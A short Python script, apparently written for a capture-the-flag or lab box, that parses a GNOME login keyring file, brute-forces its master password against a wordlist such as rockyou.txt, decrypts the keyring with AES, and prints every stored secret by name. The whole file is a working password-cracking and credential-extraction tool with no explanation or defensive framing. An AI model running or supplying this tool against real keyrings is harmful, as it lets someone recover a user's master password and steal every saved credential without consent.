#!/usr/bin/env python3
import sys, hashlib, struct
from Crypto.Cipher import AES

keyring = "home/masquerade/.local/share/keyrings/login.keyring"
wordlist = "rockyou.txt"

if len(sys.argv) > 1:
    wordlist = sys.argv[1]
if len(sys.argv) > 2:
    keyring = sys.argv[2]

data = open(keyring, "rb").read()

off = 20                                    
n = int.from_bytes(data[off:off + 4], "big")
off += 4 + n + 24

iters = int.from_bytes(data[off:off + 4], "big") 
off += 4
salt = data[off:off + 8] 
off += 24

n_items = int.from_bytes(data[off:off + 4], "big")
off += 4

for _ in range(n_items):
    off += 8
    n_attrs = int.from_bytes(data[off:off + 4], "big")
    off += 4
    for _ in range(n_attrs):
        n = int.from_bytes(data[off:off + 4], "big")
        off += 4 + n
        t = int.from_bytes(data[off:off + 4], "big")
        off += 4
        if t == 0:                          
            n = int.from_bytes(data[off:off + 4], "big")
            off += 4 + n
        else:                               
            off += 4

size = int.from_bytes(data[off:off + 4], "big")
off += 4
ct = data[off:off + size]

print("[*] iters=%d salt=%s" % (iters, salt.hex()))


def try_password(pw):
    d = hashlib.sha256(pw + salt).digest()
    for _ in range(iters - 1):
        d = hashlib.sha256(d).digest()
    pt = AES.new(d[:16], AES.MODE_CBC, d[16:]).decrypt(ct)
    if hashlib.md5(pt[16:]).digest() == pt[:16]:
        return pt
    return None


found = None
for line in open(wordlist, "rb"):
    pw = line.strip()
    pt = try_password(pw)
    if pt:
        print("[+] password: %s" % pw.decode())
        found = pt[16:]
        break

if found is None:
    sys.exit("[-] no luck, try a bigger wordlist")

o = 0
for _ in range(n_items):
    n = int.from_bytes(found[o:o + 4], "big")
    o += 4
    name = found[o:o + n]; o += n
    n = int.from_bytes(found[o:o + 4], "big")
    o += 4
    secret = found[o:o + n]; o += n
    print("%s: %s" % (name.decode(), secret.decode()))
